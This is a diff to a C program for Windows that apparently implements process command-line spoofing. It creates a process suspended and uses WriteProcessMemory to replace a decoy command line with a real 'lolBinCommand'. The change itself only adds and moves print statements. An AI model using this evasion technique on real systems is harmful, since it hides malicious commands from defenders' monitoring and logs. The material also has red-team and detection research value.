@@ -19,6 +19,9 @@ int main() {
     wchar_t *realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
     MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, realCmdlineW, realCmdlineLen);
 
+    printf("%s\n", spoofedCmdline);
+    wprintf(L"%ls\n", realCmdlineW);
+
     // Create suspended process
     STARTUPINFOEX si = { sizeof(si) };
     PROCESS_INFORMATION pi;
@@ -48,8 +51,6 @@ int main() {
         free(realCmdlineW);
         return FALSE;
     }
-
-    wprintf(L"%ls\n", realCmdlineW);
 
     // Change command line
     if (!WriteProcessMemory(pi.hProcess, cmdLineAddress, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
